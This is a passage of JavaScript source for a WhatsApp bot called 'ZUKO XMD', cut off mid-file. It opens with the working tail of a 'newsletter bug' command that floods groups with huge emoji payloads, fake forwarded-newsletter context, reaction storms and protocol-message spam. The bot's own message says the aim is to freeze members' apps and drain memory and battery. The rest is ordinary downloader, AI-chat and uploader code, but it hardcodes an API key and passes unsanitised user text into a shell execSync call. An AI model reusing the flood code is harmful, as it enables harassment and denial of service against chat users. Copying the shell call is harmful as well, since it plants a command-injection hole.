                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: `120363${Math.floor(Math.random() * 1000000000000)}@newsletter`,
                        newsletterName: '📰'.repeat(200 * intensity),
                        serverMessageId: 143
                    }
                }
            }).catch(() => {});
            await delay(500);
        }
        
        // ─── BUG 7: Newsletter Reaction Storm ───
        const nlEmojis = ['📰', '💀', '🔥', '💢', '💥', '⚠️', '🚫'];
        for (let i = 0; i < intensity * 50; i++) {
            const fakeKey = {
                remoteJid: m.chat,
                id: `nl_${i}_${Date.now()}`,
                participant: participants[Math.floor(Math.random() * participants.length)]?.id || m.sender
            };
            await empire.sendMessage(m.chat, {
                react: {
                    text: nlEmojis[Math.floor(Math.random() * nlEmojis.length)],
                    key: fakeKey
                },
                contextInfo: {
                    forwardingScore: 9999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: `120363${Math.floor(Math.random() * 1000000000000)}@newsletter`,
                        newsletterName: '📰'.repeat(100 * intensity),
                        serverMessageId: 143
                    }
                }
            }).catch(() => {});
            await delay(50);
        }
        
        // ─── BUG 8: Newsletter Text Flood ───
        const nlText = '📰'.repeat(10000 * intensity) + '\n' + '💀'.repeat(10000 * intensity) + '\n' + 'ZUKO XMD NEWSLETTER BUG'.repeat(5000 * intensity);
        for (let i = 0; i < intensity * 5; i++) {
            await empire.sendMessage(m.chat, {
                text: nlText.slice(0, 6000),
                contextInfo: {
                    forwardingScore: 9999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: `120363${Math.floor(Math.random() * 1000000000000)}@newsletter`,
                        newsletterName: '📰'.repeat(200 * intensity),
                        serverMessageId: 143
                    }
                }
            }).catch(() => {});
            await delay(200);
        }
        
        // ─── BUG 9: Newsletter Protocol Spam ───
        for (let i = 0; i < intensity * 10; i++) {
            await empire.relayMessage(m.chat, {
                protocolMessage: {
                    type: 0,
                    key: { 
                        id: `nl_${i}_${Date.now()}`, 
                        remoteJid: m.chat 
                    },
                    deletedMessage: { 
                        conversation: '📰'.repeat(5000 * intensity) 
                    }
                }
            }, { participant: { jid: m.sender } }).catch(() => {});
            await delay(100);
        }
        
        // ─── BUG 10: Newsletter Context Overload ───
        for (let i = 0; i < intensity * 20; i++) {
            await empire.sendMessage(m.chat, {
                text: ' ',
                contextInfo: {
                    forwardingScore: 9999 * intensity,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: `120363${Math.floor(Math.random() * 1000000000000)}@newsletter`,
                        newsletterName: '📰'.repeat(500 * intensity),
                        serverMessageId: 143 * intensity
                    },
                    mentionedJid: allMembers,
                    quotedMessage: {
                        conversation: '📰'.repeat(5000 * intensity)
                    }
                }
            }).catch(() => {});
            await delay(100);
        }
        
        reply(`📰 *NEWSLETTER BUG COMPLETE!*

👥 *Group:* ${groupName || 'this group'}
💥 *Intensity:* ${intensity}/5
🔢 *Vectors:* 10
⚡ *Status:* NEWSLETTER DESTROYED

🔥 *Effects on group:*
• Fake newsletter forwarding spam
• Mass notification overload
• UI freezing for members
• Memory and battery drain
• Chat database corruption

📰 *Multiple members will see "Forwarded from [Newsletter]" on spam messages!*

💀 *ZUKO XMD - Newsletter Annihilator*`);
        
    } catch (e) {
        console.error('Newsletter bug error:', e);
        reply(`❌ *Newsletter bug failed:* ${e.message || 'Unknown error'}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  NEWSLETTER BUG PREVIEW (Safe Test)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'nltest':
case 'nlpreview': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    if (!isGroup) return reply('👥 *This command only works in groups!*');
    
    const count = Math.min(10, participants.length);
    let preview = `📰━━━━━[ NEWSLETTER BUG PREVIEW ]━━━━━📰\n\n`;
    preview += `👥 *Group:* ${groupName || 'this group'}\n`;
    preview += `👤 *Members:* ${participants.length}\n`;
    preview += `💥 *Intensities:* 1-5\n\n`;
    preview += `📰 *What this bug does:*\n`;
    preview += `• Spam "Forwarded from Newsletter" messages\n`;
    preview += `• Fake newsletter context on all messages\n`;
    preview += `• Mass mentions with newsletter tags\n`;
    preview += `• Newsletter poll and document spam\n\n`;
    preview += `👉 *To deploy:* ${prefix}nlbug <1-5>`;
    
    reply(preview);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  NEWSLETTER BUG CLEANUP
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'nlclean':
case 'cleannewsletter': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    if (!isGroup) return reply('👥 *This command only works in groups!*');
    
    await reply('🧹 *Cleaning newsletter bug traces...*');
    
    try {
        // Send cleanup messages
        for (let i = 0; i < 10; i++) {
            await empire.sendMessage(m.chat, {
                text: ' ',
                contextInfo: {
                    forwardingScore: 0,
                    isForwarded: false
                }
            }).catch(() => {});
            await delay(100);
        }
        
        await reply(`🧹 *NEWSLETTER BUG CLEANUP COMPLETE!*

✅ *All newsletter bug traces cleared.*
🔄 *Members can now restart WhatsApp.*
📰 *ZUKO XMD - Newsletter Cleaner*`);
        
    } catch (e) {
        reply(`❌ *Cleanup failed:* ${e.message}`);
    }
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  DOWNLOAD — YOUTUBE VIDEO
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'ytb':
case 'ytmp4':
case 'youtube': {
    if (!text) return reply(`🎬 Usage: ${prefix}ytb <song name or YouTube URL>\nExample: ${prefix}ytb faded alan walker`);
    try {
        await reply('🔎 *Searching YouTube...*');
        let video;
        if (/youtu\.?be/.test(text)) {
            const search = await yts({ videoId: text.match(/(?:v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/)?.[1] || '' }).catch(() => null);
            video = search || (await yts(text)).videos?.[0];
        } else {
            const search = await yts(text);
            video = search.videos?.[0];
        }
        if (!video) return reply('❌ No results found for that query.');

        const apis = [
            async () => {
                const { data } = await axios.get('https://api.giftedtech.web.id/api/download/dlmp4', { params: { url: video.url, apikey: 'gifted' }, timeout: 40000 });
                return data?.result?.download_url || data?.result?.url;
            },
            async () => {
                const { data } = await axios.get('https://apis.davidcyriltech.my.id/youtube/mp4', { params: { url: video.url }, timeout: 40000 });
                return data?.result?.download_url || data?.url;
            },
            async () => {
                const { data } = await axios.get('https://api.dreaded.site/api/ytdl/video', { params: { url: video.url }, timeout: 40000 });
                return data?.result?.downloadUrl || data?.result?.download_url;
            }
        ];
        let videoUrl = null;
        for (const api of apis) {
            try { videoUrl = await api(); if (videoUrl) break; } catch { /* next */ }
        }
        if (!videoUrl) {
            try {
                const info = await ytdl.getInfo(video.url);
                const fmts = ytdl.filterFormats(info.formats, 'videoandaudio');
                videoUrl = fmts.sort((a, b) => (b.height || 0) - (a.height || 0))[0]?.url;
            } catch { /* ignore */ }
        }
        if (!videoUrl) return reply('❌ Could not fetch video right now. Try again shortly.');
        await empire.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: `🎬 *${video.title}*\n⏱️ ${video.timestamp}`,
            fileName: `${video.title.replace(/[\\/:*?"<>|]/g, '').slice(0, 60)}.mp4`
        }, { quoted: m });
    } catch (e) {
        reply(`❌ Failed to download video: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  DOWNLOAD — SPOTIFY
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'spotify': {
    if (!text) return reply(`🎧 Usage: ${prefix}spotify <song name or Spotify URL>\nExample: ${prefix}spotify blinding lights the weeknd`);
    try {
        await reply('🔎 *Searching Spotify...*');
        const apis = [
            async () => {
                const { data } = await axios.get('https://api.giftedtech.web.id/api/download/spotifydl', { params: { url: text, apikey: 'gifted' }, timeout: 30000 });
                return { url: data?.result?.download_url, title: data?.result?.title };
            },
            async () => {
                const { data } = await axios.get('https://apis.davidcyriltech.my.id/spotify/download', { params: { query: text }, timeout: 30000 });
                return { url: data?.result?.downloadUrl || data?.result?.download_url, title: data?.result?.title };
            }
        ];
        let result = null;
        for (const api of apis) {
            try { const r = await api(); if (r?.url) { result = r; break; } } catch { /* next */ }
        }
        if (!result) return reply('❌ Could not find/download that track. Try a more specific search or a direct Spotify URL.');
        await empire.sendMessage(m.chat, {
            audio: { url: result.url },
            mimetype: 'audio/mp4',
            fileName: `${(result.title || 'track').replace(/[\\/:*?"<>|]/g, '').slice(0, 60)}.mp3`
        }, { quoted: m });
    } catch (e) {
        reply(`❌ Spotify download failed: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  DOWNLOAD — FACEBOOK
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'fbdl':
case 'facebook':
case 'fb': {
    if (!text) return reply('👉 *Usage:* .fbdl <facebook_url>\nExample: .fbdl https://www.facebook.com/watch?v=123456789');
    
    // Validate Facebook URL
    if (!text.includes('facebook.com') && !text.includes('fb.watch')) {
        return reply('❌ Please provide a valid Facebook video URL.');
    }
    
    reply('📥 *Processing Facebook video...* Please wait.');
    
    try {
        const apiUrl = `https://apis.malvryx.dev/api/downloader/fbdl?url=${encodeURIComponent(text)}`;
        const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
                'X-API-Key': 'mlvx_free_15c210e6c0fed4d5d90d556c0bebd068480f03740106d0d3c8189362089ac986',
                'Content-Type': 'application/json'
            }
        });
        
        const data = await response.json();
        
        // Check if API returned an error
        if (!response.ok || data.status === false || data.error) {
            return reply(`❌ *API Error:* ${data.message || data.msg || data.error || 'Failed to process video'}`);
        }
        
        // Extract video URLs
        const result = data.result || data.data || data;
        const videoUrl = result.video || result.sd || result.hd || result.url || result.download_url;
        const audioUrl = result.audio || result.music_url;
        const title = result.title || result.caption || 'Facebook Video';
        
        if (!videoUrl) {
            return reply('❌ No downloadable video found. The video may be private or unavailable.');
        }
        
        // Send video with caption
        await empire.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: `📹 *${title}*\n\n🔗 *Source:* ${text}`,
            contextInfo: {
                externalAdReply: {
                    title: 'Facebook Downloader',
                    body: 'Downloaded by ZUKO XMD',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
        
        // Also send audio if available
        if (audioUrl) {
            await delay(1000);
            await empire.sendMessage(m.chat, {
                audio: { url: audioUrl },
                mimetype: 'audio/mpeg',
                fileName: `${title}.mp3`
            }, { quoted: m });
        }
        
    } catch (e) {
        console.error('Facebook download error:', e);
        if (e.response) {
            const errorMsg = e.response.data?.msg || e.response.statusText || 'Server error';
            reply(`❌ *Download failed:* ${errorMsg}`);
        } else {
            reply('❌ Failed to download video. Check your connection or try again later.');
        }
    }
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  TIKTOK STALK / PROFILE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'ttstalk':
case 'tiktokstalk':
case 'ttprofile': {
    if (!text) return reply(`🔍 Usage: ${prefix}ttstalk <username>\nExample: ${prefix}ttstalk lonely_world01`);
    
    const username = text.trim().replace(/^@/, ''); // Remove @ if present
    await reply(`🔍 *Searching for @${username} on TikTok...*`);
    
    try {
        const apiUrl = `https://omegatech-api.dixonomega.tech/api/Stalk/Tiktok?action=stalk&username=${encodeURIComponent(username)}`;
        const response = await axios.get(apiUrl, { timeout: 15000 });
        const data = response.data;
        
        // Check if API returned an error
        if (!data.success || data.statusCode !== 200) {
            return reply(`❌ *Error:* ${data.message || data.msg || 'Failed to fetch TikTok profile'}`);
        }
        
        const user = data.data;
        if (!user) return reply(`❌ User @${username} not found.`);
        
        // Format stats with commas
        const followers = user.stats?.followers?.toLocaleString() || 0;
        const following = user.stats?.following?.toLocaleString() || 0;
        const hearts = user.stats?.hearts?.toLocaleString() || 0;
        const videos = user.stats?.videos?.toLocaleString() || 0;
        
        // Format join date
        let joinDate = 'Unknown';
        if (user.create_time) {
            const date = new Date(user.create_time);
            joinDate = date.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
        }
        
        // Build profile text
        const profileText =
`🎭━━━━━[ TIKTOK PROFILE ]━━━━━🎭

👤 *Username:* @${user.username}
📛 *Nickname:* ${user.nickname || 'N/A'}
${user.verified ? '✅ *Verified*' : '❌ *Not Verified*'}
${user.private ? '🔒 *Private Account*' : '🌍 *Public Account*'}
📅 *Joined:* ${joinDate}
🌎 *Region:* ${user.region || 'Unknown'}

📊 *Statistics:*
👥 *Followers:* ${followers}
👣 *Following:* ${following}
❤️ *Hearts:* ${hearts}
🎬 *Videos:* ${videos}

${user.bio_link ? `🔗 *Link:* ${user.bio_link}` : ''}
${user.signature ? `📝 *Bio:* ${user.signature.substring(0, 100)}${user.signature.length > 100 ? '...' : ''}` : ''}

🎭━━━━━━━━━━━━━━━━━━━━━━━

📱 *Data Source:* OmegaTech API
🕐 *Fetched:* ${new Date(data.timestamp).toLocaleString()}`;

        // Try to send with avatar
        try {
            if (user.avatar) {
                await empire.sendMessage(m.chat, {
                    image: { url: user.avatar },
                    caption: profileText,
                    contextInfo: {
                        externalAdReply: {
                            title: `@${user.username} on TikTok`,
                            body: `${followers} followers · ${videos} videos`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, { quoted: m });
            } else {
                await empire.sendMessage(m.chat, { text: profileText }, { quoted: m });
            }
        } catch (e) {
            // If image fails, send text only
            await empire.sendMessage(m.chat, { text: profileText }, { quoted: m });
        }
        
    } catch (e) {
        console.error('TikTok stalk error:', e);
        if (e.response?.status === 404) {
            reply(`❌ User @${username} not found. Please check the username and try again.`);
        } else if (e.response) {
            const errorMsg = e.response.data?.message || e.response.statusText || 'Server error';
            reply(`❌ *API Error:* ${errorMsg}`);
        } else if (e.code === 'ECONNABORTED') {
            reply('❌ *Request timed out.* The server took too long to respond.');
        } else {
            reply(`❌ *Failed to fetch profile:* ${e.message || 'Connection error'}`);
        }
    }
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  BOT MODE - PUBLIC / PRIVATE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'mode':
case 'botmode': {
    if (!isCreator) return reply('❌ *Only the bot owner can change bot mode.*');
    
    const opt = args[0]?.toLowerCase();
    
    // ─── Show current mode ───
    if (!opt) {
        const mode = db.botMode?.mode || 'public';
        const whitelist = db.botMode?.whitelist || [];
        const whitelistDisplay = whitelist.length > 0 
            ? whitelist.map(j => `• @${j.split('@')[0]}`).join('\n') 
            : 'None';
        
        return reply(
`🔒━━━━━[ BOT MODE ]━━━━━🔒

📊 *Current Mode:* ${mode.toUpperCase()}
👥 *Whitelisted Users:* ${whitelist.length}

👤 *Whitelist:*
${whitelistDisplay}

📌 *Commands:*
${prefix}mode public     - Allow everyone to use commands
${prefix}mode private    - Only owner & whitelisted users
${prefix}mode whitelist  - Show whitelist
${prefix}mode add @user  - Add user to whitelist
${prefix}mode remove @user - Remove from whitelist

🔒━━━━━━━━━━━━━━━━━━━━━━━`
        );
    }
    
    // ─── Set to PUBLIC mode ───
    if (opt === 'public') {
        db.botMode.mode = 'public';
        saveDB();
        return reply(`🌍 *Bot mode set to PUBLIC*\n\n✅ Everyone can use all commands.`);
    }
    
    // ─── Set to PRIVATE mode ───
    if (opt === 'private') {
        db.botMode.mode = 'private';
        saveDB();
        return reply(`🔒 *Bot mode set to PRIVATE*\n\n✅ Only the bot owner and whitelisted users can use commands.`);
    }
    
    // ─── Show whitelist ───
    if (opt === 'whitelist' || opt === 'wl') {
        const whitelist = db.botMode?.whitelist || [];
        if (whitelist.length === 0) {
            return reply(`👤 *Whitelist is empty.*\n\nAdd users with: ${prefix}mode add @user`);
        }
        const list = whitelist.map((j, i) => `${i+1}. @${j.split('@')[0]}`).join('\n');
        return reply(`👤━━━━━[ WHITELIST ]━━━━━👤\n\n${list}\n\n👤━━━━━━━━━━━━━━━━━━━━━━━`);
    }
    
    // ─── Add user to whitelist ───
    if (opt === 'add' || opt === 'adduser') {
        let target = m.mentionedJid?.[0] || m.quoted?.sender || args[1];
        if (!target) return reply(`❌ *Usage:* ${prefix}mode add @user`);
        
        // Clean JID
        target = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        if (!db.botMode.whitelist) db.botMode.whitelist = [];
        if (db.botMode.whitelist.includes(target)) {
            return reply(`⚠️ @${target.split('@')[0]} is already whitelisted.`, { mentions: [target] });
        }
        
        db.botMode.whitelist.push(target);
        saveDB();
        return reply(`✅ @${target.split('@')[0]} has been added to the whitelist.`, { mentions: [target] });
    }
    
    // ─── Remove user from whitelist ───
    if (opt === 'remove' || opt === 'rem' || opt === 'del') {
        let target = m.mentionedJid?.[0] || m.quoted?.sender || args[1];
        if (!target) return reply(`❌ *Usage:* ${prefix}mode remove @user`);
        
        target = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        if (!db.botMode.whitelist) db.botMode.whitelist = [];
        const index = db.botMode.whitelist.indexOf(target);
        if (index === -1) {
            return reply(`⚠️ @${target.split('@')[0]} is not in the whitelist.`, { mentions: [target] });
        }
        
        db.botMode.whitelist.splice(index, 1);
        saveDB();
        return reply(`✅ @${target.split('@')[0]} has been removed from the whitelist.`, { mentions: [target] });
    }
    
    // ─── Invalid option ───
    return reply(`❌ *Invalid option.*\n\n${prefix}mode public\n${prefix}mode private\n${prefix}mode whitelist\n${prefix}mode add @user\n${prefix}mode remove @user`);
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  AI — GEMINI & GROQ (DUAL API)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'ai':
case 'ask':
case 'chat':
case 'gemini':
case 'groq': {
    if (!text) return reply(`🤖 *Usage:* ${prefix}ai <question>\nExample: ${prefix}ai What is the meaning of life?`);
    
    // Store conversation history per user
    if (!global.aiHistory) global.aiHistory = {};
    if (!global.aiHistory[m.sender]) global.aiHistory[m.sender] = [];
    
    // Add user query to history
    global.aiHistory[m.sender].push({ role: 'user', content: text });
    
    // Limit history to last 10 messages
    if (global.aiHistory[m.sender].length > 10) {
        global.aiHistory[m.sender] = global.aiHistory[m.sender].slice(-10);
    }
    
    await reply('🤔 *Thinking...* Please wait.');
    
    try {
        let answer = null;
        let usedApi = '';
        
        // ─── TRY GEMINI API ───
        if (GoogleGenerativeAI && GEMINI_API_KEY) {
            try {
                const genAI = new GoogleGenerativeAI(GEMINI_API_KEY);
                
                // Try different Gemini models
                const models = ['gemini-1.5-flash', 'gemini-pro', 'gemini-1.5-pro'];
                for (const modelName of models) {
                    try {
                        const model = genAI.getGenerativeModel({ model: modelName });
                        const result = await model.generateContent(text);
                        answer = result.response.text();
                        usedApi = `Gemini ${modelName}`;
                        console.log(`✅ Gemini ${modelName} response received`);
                        break;
                    } catch (e) {
                        console.log(`❌ Gemini ${modelName} failed:`, e.message);
                    }
                }
            } catch (e) {
                console.log('❌ Gemini API failed:', e.message);
            }
        }
        
        // ─── FALLBACK TO GROQ API ───
        if (!answer && Groq && GROQ_API_KEY) {
            try {
                const groq = new Groq({ apiKey: GROQ_API_KEY });
                
                const messages = global.aiHistory[m.sender].map(msg => ({
                    role: msg.role,
                    content: msg.content
                }));
                
                // Try different Groq models
                const groqModels = ['mixtral-8x7b-32768', 'llama3-70b-8192', 'gemma2-9b-it'];
                for (const model of groqModels) {
                    try {
                        const chatCompletion = await groq.chat.completions.create({
                            messages: messages,
                            model: model,
                            temperature: 0.7,
                            max_tokens: 1024,
                        });
                        answer = chatCompletion.choices[0]?.message?.content || null;
                        if (answer) {
                            usedApi = `Groq ${model}`;
                            console.log(`✅ Groq ${model} response received`);
                            break;
                        }
                    } catch (e) {
                        console.log(`❌ Groq ${model} failed:`, e.message);
                    }
                }
            } catch (e) {
                console.log('❌ Groq API failed:', e.message);
            }
        }
        
        // ─── FINAL FALLBACK: Shizo API ───
        if (!answer) {
            try {
                const shizoRes = await axios.get(
                    `https://api.shizo.top/ai/gpt?apikey=shizo&query=${encodeURIComponent(text)}`,
                    { timeout: 30000 }
                );
                if (shizoRes.data?.status && shizoRes.data?.result) {
                    answer = shizoRes.data.result;
                    usedApi = 'Shizo GPT';
                    console.log('✅ Shizo response received');
                }
            } catch (e) {
                console.log('❌ Shizo failed:', e.message);
            }
        }
        
        // ─── FINAL FALLBACK: Pollinations AI ───
        if (!answer) {
            try {
                const pollRes = await axios.get(
                    `https://text.pollinations.ai/${encodeURIComponent(text)}`,
                    { params: { model: 'openai' }, timeout: 30000 }
                );
                if (pollRes.data) {
                    answer = typeof pollRes.data === 'string' ? pollRes.data : JSON.stringify(pollRes.data);
                    usedApi = 'Pollinations AI';
                    console.log('✅ Pollinations response received');
                }
            } catch (e) {
                console.log('❌ Pollinations failed:', e.message);
            }
        }
        
        if (!answer) {
            return reply('❌ All AI services are currently unavailable. Please try again later.');
        }
        
        // Store AI response in history
        global.aiHistory[m.sender].push({ role: 'assistant', content: answer });
        
        // Clean the answer
        answer = answer.replace(/```/g, '').trim();
        
        // Truncate if too long
        if (answer.length > 4000) {
            answer = answer.slice(0, 3950) + '...\n\n📌 *Truncated due to length*';
        }
        
        // Build response
        const responseText = `🤖 *${usedApi}*\n\n${answer}\n\n━━━━━━━━━━━━━━━━\n💡 *Ask anything else:* ${prefix}ai <question>`;
        
        await empire.sendMessage(m.chat, {
            text: responseText,
            contextInfo: {
                externalAdReply: {
                    title: 'AI Assistant',
                    body: `Powered by ${usedApi}`,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
        
    } catch (e) {
        console.error('AI error:', e);
        reply(`❌ Failed to get response: ${e.message || 'Unknown error'}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  AI — CLEAR HISTORY
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'aiclear':
case 'clearai':
case 'clear': {
    if (global.aiHistory) {
        delete global.aiHistory[m.sender];
        reply('🧹 *AI conversation history cleared.*');
    } else {
        reply('ℹ️ No history to clear.');
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  AI — TEST (Debug)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'aitest':
case 'testai': {
    if (!isCreator) return reply('❌ Owner only!');
    
    const results = [];
    
    // Test Gemini
    if (GoogleGenerativeAI && GEMINI_API_KEY) {
        try {
            const genAI = new GoogleGenerativeAI(GEMINI_API_KEY);
            const model = genAI.getGenerativeModel({ model: 'gemini-1.5-flash' });
            const result = await model.generateContent('Say "Gemini is working!"');
            results.push('✅ Gemini: Working');
        } catch (e) {
            results.push(`❌ Gemini: ${e.message}`);
        }
    } else {
        results.push('❌ Gemini: Not configured');
    }
    
    // Test Groq
    if (Groq && GROQ_API_KEY) {
        try {
            const groq = new Groq({ apiKey: GROQ_API_KEY });
            const completion = await groq.chat.completions.create({
                messages: [{ role: 'user', content: 'Say "Groq is working!"' }],
                model: 'mixtral-8x7b-32768',
                max_tokens: 20,
            });
            results.push('✅ Groq: Working');
        } catch (e) {
            results.push(`❌ Groq: ${e.message}`);
        }
    } else {
        results.push('❌ Groq: Not configured');
    }
    
    reply(`🔍 *AI TEST RESULTS*\n\n${results.join('\n')}`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  AI — SET PREFERRED MODEL
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'aimodel':
case 'setai': {
    if (!isCreator) return reply('❌ *Only the bot owner can change AI model preference.*');
    
    const model = args[0]?.toLowerCase();
    const validModels = ['gemini', 'groq', 'mixtral', 'llama3', 'auto'];
    
    if (!model) {
        return reply(`🤖 *AI Models Available:*\n\n${validModels.map(m => `• ${m}`).join('\n')}\n\nUsage: ${prefix}aimodel <model>\nCurrent: ${global.aiPreference || 'auto'}`);
    }
    
    if (!validModels.includes(model)) {
        return reply(`❌ Invalid model. Available: ${validModels.join(', ')}`);
    }
    
    global.aiPreference = model;
    reply(`✅ *AI model set to:* ${model.toUpperCase()}`);
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  CHECK MODE STATUS (Shortcut)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'status':
case 'modeinfo': {
    const mode = db.botMode?.mode || 'public';
    const whitelist = db.botMode?.whitelist || [];
    const isWhitelisted = whitelist.includes(senderPn);
    
    return reply(
`🔒━━━━━[ BOT STATUS ]━━━━━🔒

📊 *Mode:* ${mode.toUpperCase()}
👤 *Your Status:* ${isCreator ? '👑 OWNER' : isWhitelisted ? '✅ WHITELISTED' : '❌ NORMAL'}

${mode === 'private' && !isCreator && !isWhitelisted ? '⚠️ *You are restricted from using commands.*' : ''}

🔒━━━━━━━━━━━━━━━━━━━━━━━`
    );
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  TIKTOK STALK SHORT (alias)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'tt':
case 'tiktok': {
    // If it's just a username, use stalk
    if (text && !text.includes('tiktok.com')) {
        // Re-run the stalk command logic
        return require('child_process').execSync(`node -e "const c = require('${__filename}'); c.handleTTStalk('${text}')"`);
    }
    // Otherwise, treat as download (if you have a download command)
    return reply(`💡 Use ${prefix}ttstalk <username> to view a profile, or ${prefix}ttdl <url> to download videos.`);
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  UPLOAD — CATBOX (FIXED)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  PERMANENT UPLOADER (KAPPA)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'upload':
case 'uploader':
case 'kappa':
case 'permanent': {
    // Check if replying to a media message
    const quoted = m.quoted ? m.quoted : m;
    const mime = quoted.mimetype || '';
    
    // If text is a URL, use it directly
    if (text && (text.startsWith('http://') || text.startsWith('https://'))) {
        await uploadViaKappa(empire, m, text, reply, prefix);
        break;
    }
    
    // Otherwise check if replying to media
    if (!/image|video|audio|application/.test(mime)) {
        return reply(`📤 *Usage:* ${prefix}upload <image/video URL>\nOr reply to a media message with ${prefix}upload\n\n_Uploads to Kappa.lol (permanent storage)_`);
    }
    
    await reply('⏳ *Uploading to Kappa.lol...* Please wait.');
    
    try {
        // Download the media buffer
        const mediaBuffer = await empire.downloadMediaMessage(quoted);
        if (!mediaBuffer) return reply('❌ Failed to download media.');
        
        // Get file extension from mime type
        const extension = mime.split('/')[1]?.split(';')[0] || 'jpg';
        const filename = `file_${Date.now()}.${extension}`;
        
        // Upload directly to Kappa via OmegaTech API
        const formData = new FormData();
        const blob = new Blob([mediaBuffer], { type: mime });
        formData.append('file', blob, filename);
        
        const response = await fetch('https://omegatech-api.dixonomega.tech/api/tools/Kappa-uploader', {
            method: 'POST',
            body: formData
        });
        
        const data = await response.json();
        
        // Check if upload was successful
        if (!data.success || data.statusCode !== 200) {
            return reply(`❌ *Upload failed:* ${data.message || data.msg || 'Unknown error'}`);
        }
        
        const fileData = data.data?.files?.[0];
        if (!fileData || !fileData.url) {
            return reply(`❌ No file URL returned.\nResponse: ${JSON.stringify(data, null, 2)}`);
        }
        
        // Send the uploaded file URL
        await empire.sendMessage(m.chat, {
            text: `✅━━━━━[ UPLOAD SUCCESS ]━━━━━✅

📤 *File uploaded to Kappa.lol!*
🔗 *URL:* ${fileData.url}
📁 *Filename:* ${fileData.filename}
📂 *Type:* ${mime}
💾 *Storage:* Permanent

📎 *Original:* ${quoted.mimetype || 'Media file'}

🔄 *Use this link anywhere!*`,
            contextInfo: {
                externalAdReply: {
                    title: 'Kappa.lol Uploader',
                    body: 'Permanent Storage',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
        
    } catch (e) {
        console.error('Upload error:', e);
        reply(`❌ Upload failed: ${e.message || 'Unknown error'}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  UPLOAD FROM URL
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function uploadViaKappa(empire, m, url, reply, prefix) {
    try {
        await reply('⏳ *Downloading file from URL and uploading to Kappa.lol...*');
        
        // Download the file from URL
        const response = await fetch(url);
        if (!response.ok) return reply(`❌ Failed to fetch URL: ${response.status}`);
        
        const buffer = await response.arrayBuffer();
        const contentType = response.headers.get('content-type') || 'application/octet-stream';
        const extension = contentType.split('/')[1]?.split(';')[0] || 'bin';
        const filename = `file_${Date.now()}.${extension}`;
        
        // Upload to Kappa via OmegaTech API
        const formData = new FormData();
        const blob = new Blob([buffer], { type: contentType });
        formData.append('file', blob, filename);
        
        const uploadRes = await fetch('https://omegatech-api.dixonomega.tech/api/tools/Kappa-uploader', {
            method: 'POST',
            body: formData
        });
        
        const data = await uploadRes.json();
        
        if (!data.success || data.statusCode !== 200) {
            return reply(`❌ *Upload failed:* ${data.message || 'Unknown error'}`);
        }
        
        const fileData = data.data?.files?.[0];
        if (!fileData || !fileData.url) {
            return reply(`❌ No file URL returned.`);
        }
        
        await empire.sendMessage(m.chat, {
            text: `✅━━━━━[ UPLOAD SUCCESS ]━━━━━✅

📤 *File uploaded to Kappa.lol!*
🔗 *URL:* ${fileData.url}
📁 *Filename:* ${fileData.filename}
📎 *Source:* ${url}
